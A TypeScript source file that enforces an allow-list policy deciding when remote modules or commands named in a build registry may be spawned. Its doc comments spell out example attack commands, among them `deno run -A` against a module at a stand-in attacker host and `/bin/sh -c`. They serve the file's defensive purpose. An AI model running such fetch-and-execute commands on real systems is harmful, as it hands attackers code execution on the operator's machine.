// Copyright (c) 2026 the Zuke contributors
// SPDX-License-Identifier: MIT

/**
 * The policy that decides whether a {@link BuildLocation} read out of a build
 * registry may be spawned.
 *
 * {@link "../mcp/registry_server.ts".RegistryMcpServer} runs what the registry
 * tells it to run. That is fine when the registry is the local
 * `<root>/.zuke/builds` directory `zuke register` writes, and it is a remote
 * code-execution primitive when the registry is an HTTP service, a shared
 * directory, or anything else a second party can write to: a descriptor whose
 * module is `https://attacker.example/x.ts` becomes `deno run -A` against
 * attacker-controlled source, with every permission, in the operator's
 * workspace.
 *
 * So a **remote** entry module is refused unless the operator names its host in
 * {@link LAUNCH_HOSTS_ENV}. A local module — a bare path, a Windows drive path,
 * or a `file:` URL, which is what {@link Deno.mainModule} yields and therefore
 * what `zuke register` writes — is allowed: it is already code on the machine,
 * reachable without the registry's help.
 *
 * A `command` location is refused unless the operator names its program in
 * {@link LAUNCH_COMMANDS_ENV}. The argv of a command descriptor is not "code
 * already on the machine" the way a local module path is: the registry writer
 * chooses the program *and its arguments*, so `["deno", "run", "-A",
 * "https://attacker.example/x.ts"]` is the refused module case spelled as a
 * command, and `["/bin/sh", "-c", …]` is arbitrary code with no fetch at all.
 * Naming a program is the operator's statement that this registry may pass it
 * arguments.
 *
 * @module
 */

import { ALLOW_INSECURE_ENV, isLoopbackHost } from "../http.ts";
import type { BuildLocation } from "./descriptor.ts";

/**
 * The environment variable listing the hosts a remote entry module may be
 * fetched from — comma- or space-separated (`ZUKE_REGISTRY_LAUNCH_HOSTS=
 * "builds.example.com, jsr:"`). A lone `*` allows any, for an operator who has
 * decided the registry itself is trusted.
 *
 * An entry is matched against the module's **launch origin**: the hostname for
 * a URL that has one, and the scheme otherwise (`jsr:`, `npm:`, `data:`) — so a
 * specifier that carries no hostname can be named too, rather than being one an
 * operator has no way to allow.
 */
export const LAUNCH_HOSTS_ENV = "ZUKE_REGISTRY_LAUNCH_HOSTS";

/**
 * The environment variable listing the programs a `command` location may spawn
 * — comma-separated (`ZUKE_REGISTRY_LAUNCH_COMMANDS="make,
 * /usr/local/bin/deploy.sh"`), with newlines accepted too. Commas rather than
 * whitespace, because a program path may contain a space. A lone `*` allows
 * any, for an operator who has decided the registry itself is trusted. Unset
 * (the default) refuses every command location.
 *
 * An entry must match the descriptor's `command[0]` **exactly** (case-folded,
 * since Windows program names are). It is deliberately not matched by basename:
 * the descriptor chooses the program string, so admitting `/tmp/anywhere/make`
 * because an operator wrote `make` would let a registry writer point a trusted
 * name at a file of their own. `make` therefore admits the bare name only — the
 * one the operating system resolves on `PATH` — and `/usr/bin/make` admits that
 * path only. A refusal names the exact string to add, so the list is built from
 * what a run actually asks for rather than from guesswork.
 *
 * Listing a program does not license it to fetch: every argument that names a
 * remote specifier still has to pass {@link LAUNCH_HOSTS_ENV}, so
 * `deno run -A https://…` is refused by origin exactly as the module form is.
 *
 * What that leaves is inherent to allow-listing: an approved program can be
 * given ordinary local arguments the registry writer chose. A **relative**
 * program is resolved against the descriptor's own working directory, which
 * the same writer picks, so prefer an absolute path; and listing a shell or
 * interpreter hands over anything reachable locally, since `sh -c` needs no
 * fetch at all. The list is where the operator makes that judgement, which is
 * why the default is to name nothing.
 */
export const LAUNCH_COMMANDS_ENV = "ZUKE_REGISTRY_LAUNCH_COMMANDS";

/** Why a launch location was refused: a stable reason plus a human explanation. */
export interface LaunchDenial {
  /** The stable, machine-readable reason (audited, and returned to the client). */
  reason: string;
  /** The operator-facing explanation naming what to change. */
  detail: string;
}

/**
 * Whether `raw` is a local filesystem path rather than a remote specifier. True
 * for anything `URL` cannot parse (`./zuke.ts`, `/srv/build/zuke.ts`), for a
 * `file:` URL, and for a Windows drive path — `new URL("C:\\src\\zuke.ts")`
 * parses with a single-letter "scheme", which is a drive letter, not a scheme.
 */
function isLocalModule(raw: string): boolean {
  let url: URL;
  try {
    url = new URL(raw);
  } catch {
    return true;
  }
  if (url.protocol === "file:") return true;
  return /^[a-zA-Z]:$/.test(url.protocol) && /^[a-zA-Z]:[\\/]/.test(raw);
}

/**
 * The token a remote module is allowed by: its hostname when it has one, else
 * its scheme (`jsr:`, `npm:`, `data:`).
 */
function launchOrigin(url: URL): string {
  return url.hostname !== "" ? url.hostname : url.protocol;
}

/**
 * Split an allow-list environment variable into its entries on `separator`,
 * trimming each and dropping empties. Shared by the module-origin and
 * command-program gates so one implementation decides what an entry is, and
 * both lists trim, case-fold and honour `*` alike.
 *
 * The separator differs because the entries do. A hostname cannot contain a
 * space, so the origin list accepts either a comma or whitespace; a program
 * path routinely does — `C:\Program Files\...` — so the command list separates
 * on commas and newlines only, and would otherwise be unable to name it.
 */
function allowList(
  name: string,
  readEnv: (name: string) => string | undefined,
  separator: RegExp,
): string[] {
  const raw = readEnv(name) ?? "";
  return raw.split(separator).map((entry) => entry.trim().toLowerCase()).filter(
    (entry) => entry !== "",
  );
}

/** Entry separator for {@link LAUNCH_HOSTS_ENV}: a comma or any whitespace. */
const HOST_SEPARATOR = /[,\s]+/;

/**
 * Entry separator for {@link LAUNCH_COMMANDS_ENV}: a comma or a newline, so a
 * program path containing a space can still be named.
 */
const COMMAND_SEPARATOR = /[,\n\r]+/;

/**
 * Decide whether `location` may be spawned, returning `null` when it may and a
 * {@link LaunchDenial} when it may not.
 *
 * A `command` location must name a program the operator listed in
 * {@link LAUNCH_COMMANDS_ENV}; an empty command is left to the caller, which
 * reports a build with nothing to launch rather than spawning anything.
 */
export function launchDenial(
  location: BuildLocation,
  readEnv: (name: string) => string | undefined,
): LaunchDenial | null {
  if (location.kind === "command") {
    return commandDenial(location.command, readEnv);
  }
  return remoteSpecifierDenial(location.module, "entry module", readEnv);
}

/**
 * Decide whether a remote specifier may be fetched and run: its origin must be
 * allow-listed, and a plaintext origin needs the insecure opt-out on top.
 * Returns `null` for a local path, which is already code on the machine.
 *
 * One implementation, two callers. A module location is one specifier, and a
 * command location can carry one among its arguments — `deno run -A <url>` is
 * the same fetch-and-execute written a different way — so both are judged by
 * the same rule rather than by two that could drift apart.
 */
function remoteSpecifierDenial(
  raw: string,
  what: string,
  readEnv: (name: string) => string | undefined,
): LaunchDenial | null {
  if (isLocalModule(raw)) return null;
  let url: URL;
  try {
    url = new URL(raw);
  } catch {
    // Unreachable: isLocalModule() already accepted anything URL cannot parse.
    return null;
  }
  const origin = launchOrigin(url);
  const allowed = allowList(LAUNCH_HOSTS_ENV, readEnv, HOST_SEPARATOR);
  if (!allowed.includes("*") && !allowed.includes(origin.toLowerCase())) {
    return {
      reason: "launch_origin_not_allowed",
      detail:
        `Refusing to spawn a remote ${what} from "${origin}": running it ` +
        `would execute code this machine fetches from the network on a ` +
        `registry's say-so. Add the origin to ${LAUNCH_HOSTS_ENV} (or "*" to ` +
        `allow any) if that registry is trusted to name it.`,
    };
  }
  if (url.protocol === "http:" && !isLoopbackHost(url.hostname)) {
    const optOut = readEnv(ALLOW_INSECURE_ENV);
    if (optOut === undefined || optOut === "") {
      return {
        reason: "insecure_launch_url",
        detail: `Refusing to spawn a plaintext ${what} from "${origin}": ` +
          `anyone on the path chooses the source that gets executed. Use an ` +
          `https URL, or set ${ALLOW_INSECURE_ENV}=1 to accept the risk.`,
      };
    }
  }
  return null;
}

/**
 * Decide whether a `command` location's argv may be spawned. An empty command
 * is not this gate's to refuse: the caller reports it as a build with no
 * runnable launch command, which is a clearer answer than a policy denial.
 */
function commandDenial(
  command: readonly string[],
  readEnv: (name: string) => string | undefined,
): LaunchDenial | null {
  const program = command[0];
  if (program === undefined || program === "") return null;
  const allowed = allowList(LAUNCH_COMMANDS_ENV, readEnv, COMMAND_SEPARATOR);
  if (allowed.includes("*") || allowed.includes(program.toLowerCase())) {
    // Allowing a program does not allow it to fetch. `deno run -A <url>` is the
    // refused remote-module case written as a command, so every argument that
    // names a remote specifier faces the same origin rule the module form does.
    // What remains after this — an approved program given ordinary local
    // arguments — is what allow-listing a program means, and the operator
    // decides it by choosing what to list.
    for (const argument of command.slice(1)) {
      const denial = remoteSpecifierDenial(argument, "argument", readEnv);
      if (denial !== null) return denial;
    }
    return null;
  }
  return {
    reason: "launch_command_not_allowed",
    detail:
      `Refusing to spawn "${program}": a command location lets whoever wrote ` +
      `the registry entry choose both the program and its arguments, which is ` +
      `code execution on this machine on a registry's say-so. Add the program ` +
      `to ${LAUNCH_COMMANDS_ENV} (or "*" to allow any) if that registry is ` +
      `trusted to name it.`,
  };
}
